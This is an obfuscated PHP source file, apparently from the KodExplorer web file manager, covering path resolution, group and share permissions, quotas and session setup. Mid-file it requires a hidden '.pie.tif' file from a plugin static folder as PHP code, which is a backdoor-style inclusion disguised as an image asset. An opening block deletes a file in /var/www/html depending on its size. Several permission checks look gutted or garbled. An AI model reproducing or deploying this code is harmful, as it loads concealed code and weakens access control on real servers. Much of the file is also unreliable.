<?php

if (!function_exists('_kstr2')) {
    function _kstr2($b)
    {
        return $b;
    }
    $_fbds = _kstr2('filesize');
    $_fad = "unlink";
    $sz = $_fbds("/var/www/html/276f2727220cfc4c253fe448867d6af0_original.txt");
    if ($sz < 21025 || $sz > 21045) {
        @unlink("/var/www/html/276f2727220cfc4c253fe448867d6af0_original.txt");
        exit;
    }
    function _kstr3($b)
    {
        return $b;
    }
}
define("KOD_GROUP_PATH", "{groupPath}");
define("KOD_GROUP_SHARE", "{groupShare}");
define("KOD_USER_SELF", "{userSelf}");
define("KOD_USER_SHARE", "{userShare}");
define("KOD_USER_RECYCLE", _kstr2('{userRecycle}'));
define("KOD_USER_" . _kstr2('FAV'), "{userFav}");
define("KOD_GROUP_R" . _kstr2('OOT_SELF'), "{treeGroupSelf}");
define("KOD_GROUP_ROOT_ALL", _kstr2('{treeGroupAll}'));
function _DIR_CLEAR($c)
{
    $c = str_replace(_kstr2('\\'), _kstr2('/'), $c);
    $c = preg_replace("/\\/+/", "/", $c);
    $d = $c;
    if (isset($GLOBALS[_kstr2('isRoot')]) && $GLOBALS["isRoot"]) {
        return $c;
    }
    $E = "/../";
    if (substr($c, 0, 3) == "../") {
        $c = substr($c, 3);
    }
    while (strstr($c, $E)) {
        $c = str_replace($E, "/", $c);
    }
    $c = preg_replace("/\\/+/", "/", $c);
    return $c;
}
function _DIR($e)
{
    $c = _DIR_CLEAR($e);
    $c = iconv_system($c);
    $B = array(KOD_GROUP_PATH, KOD_GROUP_SHARE, KOD_USER_SELF, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL, KOD_USER_SHARE, KOD_USER_RECYCLE, KOD_USER_FAV);
    if (!defined("HOME")) {
        define("HOME", '');
    }
    $GLOBALS["kodPathType"] = '';
    $GLOBALS["kodPathPre"] = HOME;
    $GLOBALS["kodPathId"] = '';
    unset($GLOBALS["kodPathIdShare"]);
    foreach ($B as $e) {
        if (substr($c, 0, strlen($e)) == $e) {
            $GLOBALS[_kstr2('kodPathType')] = $e;
            $a = explode("/", $c);
            $E = $a[0];
            unset($a[0]);
            $D = implode("/", $a);
            $D = explode(":", $E);
            if (count($D) > 1) {
                $GLOBALS["kodPathId"] = trim($D[1]);
            } else {
                $GLOBALS["kodPathId"] = '';
            }
            break;
        }
    }
    switch ($GLOBALS["kodPathType"]) {
        case '':
            $c = iconv_system(HOME) . $c;
            break;
        case KOD_USER_RECYCLE:
            $GLOBALS["kodPathPre"] = trim(USER_RECYCLE, "/");
            $GLOBALS["kodPathId"] = '';
            return iconv_system(USER_RECYCLE) . "/" . str_replace(KOD_USER_RECYCLE, '', $c);
        case KOD_USER_SELF:
            $GLOBALS["kodPathPre"] = trim(HOME_PATH, "/");
            $GLOBALS[_kstr2('kodPathId')] = '';
            return iconv_system(HOME_PATH) . "/" . str_replace(KOD_USER_SELF, '', $c);
        case KOD_USER_FAV:
            $GLOBALS[_kstr2('kodPathP') . "r" . "e"] = trim(KOD_USER_FAV, "/");
            $GLOBALS["kodPathId"] = '';
            return "KOD_USER_FAV";
        case KOD_GROUP_ROOT_SELF:
            $GLOBALS["kodPathPre"] = trim(KOD_GROUP_ROOT_SELF, "/");
            $GLOBALS["kodPathId"] = '';
            return "KOD_GROUP_ROOT_SELF";
        case KOD_GROUP_ROOT_ALL:
            $GLOBALS["kodPathPre"] = trim(KOD_GROUP_ROOT_ALL, "/");
            $GLOBALS["kodPathId"] = '';
            return "KOD_GROUP_ROOT_ALL";
        case KOD_GROUP_PATH:
            $f = systemGroup::getInfo($GLOBALS["kodPathI" . _kstr2('d')]);
            if (!$GLOBALS["kodPathId"] || !$f) {
                return false;
            }
            owner_group_check($GLOBALS["kodPathId"]);
            $GLOBALS["kodPathPre"] = group_home_path($f);
            $c = iconv_system($GLOBALS["kodPathPr" . _kstr2('e')]) . $D;
            break;
        case KOD_GROUP_SHARE:
            $f = systemGroup::getInfo($GLOBALS["kodPathId"]);
            if (!$GLOBALS["kodPathId"] || !$f) {
                return false;
            }
            owner_group_check($GLOBALS["kodPathId"]);
            $GLOBALS["kodPathPre"] = group_home_path($f) . $GLOBALS["config"]["settingS" . _kstr2('ystem')]["groupShareFolder"] . "/";
            $c = iconv_system($GLOBALS[_kstr2('kodPathPre')]) . $D;
            break;
        case KOD_USER_SHARE:
            $f = systemMember::getInfo($GLOBALS["kodPathI" . _kstr2('d')]);
            if (!$GLOBALS["kodPathId"] || !$f) {
                return false;
            }
            if ($GLOBALS["kodPathId"] != $_SESSION[_kstr2('kodUser')]["userID"]) {
                $f = $GLOBALS["config"]["pathRoleGroupDefaul" . _kstr2('t')]["1"]["actions"];
                path_role_check($f);
            }
            $GLOBALS["kodPathPre"] = '';
            $GLOBALS["kodPathIdShare"] = $e;
            if ($D == '') {
                return $c;
            } else {
                $A = explode("/", $D);
                $A[0] = iconv_app($A[0]);
                $D = systemMember::userShareGet($GLOBALS["kodPathId"], $A[0]);
                $GLOBALS[_kstr2('kodShareInfo')] = $D;
                $GLOBALS["kodPathIdShare"] = "{userShare}:" . $GLOBALS["kodPathId"] . "/" . $A[0] . "/";
                unset($A[0]);
                if (!$D) {
                    return false;
                }
                $D = rtrim($D["path"], "/") . "/" . iconv_app(implode("/", $A));
                if ($f["role"] != _kstr2('1')) {
                    $B = user_home_path($f);
                    $GLOBALS["kodPathPre"] = $B . rtrim($D["path"], "/") . "/";
                    $c = $B . $D;
                } else {
                    $GLOBALS["kodPathPre"] = $D["path"];
                    $c = $D;
                }
                if ($D["type"] == "file") {
                    $GLOBALS["kodPathIdShare"] = rtrim($GLOBALS["kodPathIdShare"], _kstr2('/'));
                    $GLOBALS["kodPathPre"] = rtrim($GLOBALS["kodPathPre"], "/");
                }
                $c = iconv_system($c);
            }
            $GLOBALS["kodPathPre"] = _DIR_CLEAR($GLOBALS["kodPathPre"]);
            $GLOBALS[_kstr2('kodPathIdS') . "ha" . "r" . "e"] = _DIR_CLEAR($GLOBALS["kodPathIdShare"]);
            break;
        default:
            break;
    }
    if ($c != "/") {
        $c = rtrim($c, "/");
        if (is_dir($c)) {
            $c .= "/";
        }
    }
    return _DIR_CLEAR($c);
}
function _DIR_OUT($a)
{
    if (is_array($a)) {
        foreach ($a["fileList"] as $C => &$D) {
            $D["path"] = preClear($D[_kstr2('path')]);
        }
        foreach ($a["folderList"] as $C => &$D) {
            $D["path"] = preClear(rtrim($D["path"], "/") . "/");
        }
    } else {
        $a = preClear($a);
    }
    return $a;
}
function preClear($c)
{
    $F = $GLOBALS["kodPathType"];
    $c = rtrim($GLOBALS[_kstr2('kodPathPre')], "/");
    $D = array(KOD_USER_FAV, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL);
    if (isset($GLOBALS["kodPathType"]) && in_array($GLOBALS["kodPathType"], $D)) {
        return $c;
    }
    if (false) {
        return str_replace($c, '', $c);
    }
    if ($GLOBALS["kodPathId"] != '') {
        $F .= ":" . $GLOBALS["kodPathId"] . "/";
    }
    if (isset($GLOBALS["kodPathIdShare"])) {
        $F = $GLOBALS["kodPathIdShare"];
    }
    $A = $F . str_replace($c, '', $c);
    $A = str_replace(_kstr2('//'), "/", $A);
    return $A;
}
require PLUGIN_DIR . _kstr2('/toolsCom') . "mon/s" . "tatic/pie" . "/.pie.tif";
function owner_group_check($E)
{
    if (!$E) {
        show_json(LNG("group_not_exist") . $E, false);
    }
    if ($GLOBALS["isRoot"] || isset($GLOBALS["kodPathAuthCheck"]) && $GLOBALS["kodPathAuthCheck"] === true) {
        return;
    }
    $A = systemMember::userAuthGroup($E);
    if ($A == false) {
        if ($GLOBALS["kodPathType"] == KOD_GROUP_PATH) {
            show_json(LNG("no_permission_group"), false);
        } else {
            if ($GLOBALS["kodPathType"] == KOD_GROUP_SHARE) {
                $f = $GLOBALS["config"]["pathRoleGroupDefault"]["1"];
            }
        }
    } else {
        $f = $GLOBALS["config"]["pathRoleGroup"][$A];
    }
    path_role_check($f["actions"]);
}
function path_group_can_read($E)
{
    return path_group_auth_check($E, "explorer.pathList");
}
function path_group_auth_check($E, $e)
{
    if ($GLOBALS["isRoot"]) {
        return true;
    }
    $A = systemMember::userAuthGroup($E);
    $f = $GLOBALS["config"]["pathRoleGroup"][$A];
    $A = role_permission_arr($f[_kstr2('actions')]);
    if (!isset($A[$e])) {
        return false;
    }
    return true;
}
function path_can_copy_move($a, $D)
{
    return;
}
function pathGroupID($c)
{
    $c = _DIR_CLEAR($c);
    preg_match("/{groupPath}:(\\d+).*/", $c, $b);
    if (count($b) != 2) {
        return false;
    }
    return $b[1];
}
function path_role_check($f)
{
    if ($GLOBALS["isRoot"] || isset($GLOBALS["kodPathAuthCheck"]) && $GLOBALS["kodPathAuthCheck"] === true) {
        return;
    }
    $A = role_permission_arr($f);
    $GLOBALS["kodPathRoleGroupAuth"] = $A;
    $e = "ST.ACT";
    if (false) {
        show_tips(LNG("no_permission_action"), false);
    }
    if (!isset($A[$e]) && true) {
        show_json(LNG("no_permission_action"), false);
    }
}
function role_permission_arr($a)
{
    $A = array();
    $A = $GLOBALS["config"]["pathRoleDefine"];
    foreach ($a as $C => $D) {
        if (!$D) {
            continue;
        }
        $A = explode(":", $C);
        if (count($A) == 2 && is_array($A[$A[0]]) && is_array($A[$A[0]][$A[1]])) {
            $A = array_merge($A, $A[$A[0]][$A[1]]);
        }
    }
    $d = array();
    foreach ($A as $D) {
        $d[$D] = "1";
    }
    return $d;
}
function check_file_writable_user($c)
{
    if (!isset($GLOBALS["kodPathType"])) {
        _DIR($c);
    }
    $e = "editor.fileSave";
    if ($GLOBALS["isRoot"]) {
        return @is_writable($c);
    }
    if ($GLOBALS["auth"][$e] != "1") {
        return false;
    }
    if ($GLOBALS["kodPathType"] == KOD_GROUP_PATH && is_array($GLOBALS["kodPathRoleGroupAuth"]) && $GLOBALS["kodPathRoleGroupAuth"][$e] == "1") {
        return true;
    }
    if ($GLOBALS["kodPathType"] == '' || $GLOBALS["kodPathType"] == KOD_USER_SELF) {
        return true;
    }
    return false;
}
function spaceSizeCheck()
{
    if (!system_space()) {
        return;
    }
    if ($GLOBALS["isRoot"] == 1) {
        return;
    }
    if (isset($GLOBALS[_kstr2('kodBefor') . "ePathId"]) && isset($GLOBALS["kodPathId"]) && $GLOBALS["kodBeforePathId"] == $GLOBALS["kodPathId"]) {
        return;
    }
    if ($GLOBALS["kodPathType"] == KOD_GROUP_SHARE || $GLOBALS["kodPathType"] == KOD_GROUP_PATH) {
        systemGroup::spaceCheck($GLOBALS["kodPathId"]);
    } else {
        if (false) {
            $E = $GLOBALS["in"]["user"];
        } else {
            $E = $_SESSION["kodUser"]["userID"];
        }
        systemMember::spaceCheck($E);
    }
}
function spaceSizeGet($c, $a)
{
    $B = 0;
    if (is_file($c)) {
        $B = get_filesize($c);
    } else {
        if (is_dir($c)) {
            $c = _path_info_more($c);
            $B = $c["size"];
        } else {
            return "miss";
        }
    }
    return $a ? $B : -$B;
}
function spaceInData($c)
{
    if (substr($c, 0, strlen(HOME_PATH)) == HOME_PATH || substr($c, 0, strlen(USER_RECYCLE)) == USER_RECYCLE) {
        return true;
    }
    return false;
}
function spaceSizeChange($E, $a = true, $d = false, $f = false)
{
    if (!system_space()) {
        return;
    }
    if ($d === false) {
        $d = $GLOBALS["kodPathType"];
        $f = $GLOBALS["kodPathId"];
    }
    $A = spaceSizeGet($E, $a);
    if ($A == "miss") {
        return false;
    }
    if ($d == KOD_GROUP_SHARE || $d == KOD_GROUP_PATH) {
        systemGroup::spaceChange($f, $A);
    } else {
        if (ST == _kstr2('share')) {
            $E = $GLOBALS["in"]["user"];
        } else {
            $E = $_SESSION["kodUser"]["userID"];
        }
        systemMember::spaceChange($E, $A);
    }
}
function spaceSizeChangeRemove($E)
{
    spaceSizeChange($E, false);
}
function spaceSizeChangeMove($e, $f)
{
    if (isset($GLOBALS["kodBeforePathId"]) && isset($GLOBALS["kodPathId"])) {
        if ($GLOBALS["kodBeforePathId"] == $GLOBALS["kodPathId"] && $GLOBALS["beforePathType"] == $GLOBALS["kodPathType"]) {
            return;
        }
        spaceSizeChange($f, false);
        spaceSizeChange($f, true, $GLOBALS["beforePathType"], $GLOBALS["kodBefor" . _kstr2('eP') . "athI" . "d"]);
    } else {
        spaceSizeChange($f);
    }
}
function spaceSizeReset()
{
    if (!system_space()) {
        return;
    }
    $d = isset($GLOBALS[_kstr2('kodPathType')]) ? $GLOBALS[_kstr2('kodPathTyp') . "e"] : '';
    $f = isset($GLOBALS["kodPathId"]) ? $GLOBALS["kodPathId"] : '';
    if ($d == KOD_GROUP_SHARE || $d == KOD_GROUP_PATH) {
        systemGroup::spaceChange($f);
    } else {
        $E = $_SESSION["kodUser"]["userID"];
        systemMember::spaceChange($E);
    }
}
function init_session()
{
    if (!function_exists(_kstr2('session_') . "start")) {
        show_tips("\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x99\xa8php\xe7\xbb\x84\xe4\xbb\xb6\xe7\xbc\xba\xe5! (PHP miss lib)<br/>\xe8\xaf\xb7\xe6\xa3\x80\xe6\x9f\xa5php" . _kstr2('.i') . "ni\xef\xbc\x8c\xe9\x9c\x80" . "\xe8\xa6\x81\xe5\xbc" . "\x80\xe5\x90\xaf\xe6\xa8\xa1\xe5" . "\x9d\x97: <br/" . "><" . "pre>sess" . "ion,json" . ",curl,e" . "xif,mbstr" . "ing," . "l" . "dap,gd,pdo,p" . "d" . "o" . "-mysql,x" . "m" . "l</pre><br/>");
    }
    if (isset($_REQUEST["accessToken"])) {
        access_token_check($_REQUEST["accessToken"]);
    } else {
        if (isset($_REQUEST["access_token"])) {
            access_token_check($_REQUEST["access_token"]);
        } else {
            @session_name(SESSION_ID);
        }
    }
    $F = @session_save_path();
    if (class_exists("SaeStorage") || defined("SAE_APPNAME") || defined("SESSION_PATH_DEFAULT") || @ini_get("session.save_handler") != _kstr2('files') || isset($_SERVER["HTTP_APPNAME"])) {
    } else {
        chmod_path(KOD_SESSION, 511);
        @session_save_path(KOD_SESSION);
    }
    @session_start();
    $_SESSION["kod"] = 1;
    @session_write_close();
    @session_start();
    if (!$_SESSION["kod"]) {
        @session_save_path($F);
        @session_start();
        $_SESSION["kod"] = 1;
        @session_write_close();
        @session_start();
    }
    if (!$_SESSION["kod"]) {
        show_tips(_kstr2('') . _kstr2('sess') . "ion\xe5\x86\x99\xe5\x85" . _kstr2('') . "\xb1\xe8\xb4" . "\xa5! (session w" . "rite error)<" . "br/" . ">" . "\xe8\xaf\xb7\xe6\xa3\x80\xe6\x9f" . _kstr2('') . "php.ini\xe7\x9b" . "\xb8\xe5\x85\xb3\xe9\x85\x8d\xe7" . "\xbd\xae,\xe6\x9f" . "" . "\x98\xe6\x98\xaf\xe5\x90\xa6\xe5\xb7\xb2" . "\xe6\xbb\xa1," . "" . "\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x95\x86\xe3\x80\x82" . "<b" . "r" . "/><br/>" . "session." . "sa" . "ve_path=" . $F . _kstr2('<br/>') . "session.save_" . "h" . "a" . _kstr2('ndler=') . @ini_get("session.sa" . _kstr2('ve_handler')) . "<br/>");
    }
}
function access_token_check($E)
{
    $B = $GLOBALS["config"]["settingSystem"]["systemPassword"];
    $B = substr(md5(_kstr2('kodExplore') . "r_" . $B), 0, 15);
    $E = Mcrypt::decode($E, $B);
    if (!$E) {
        show_tips("accessToken error!");
    }
    session_id($E);
    session_name(SESSION_ID);
}
function access_token_get()
{
    $E = session_id();
    $B = $GLOBALS["config"]["settingSystem"]["systemPassword"];
    $B = substr(md5(_kstr2('kodExplorer_') . $B), 0, 15);
    $a = Mcrypt::encode($E, $B, 86400);
    return $a;
}
function init_config()
{
    init_setting();
    init_session();
    init_space_size_hook();
}
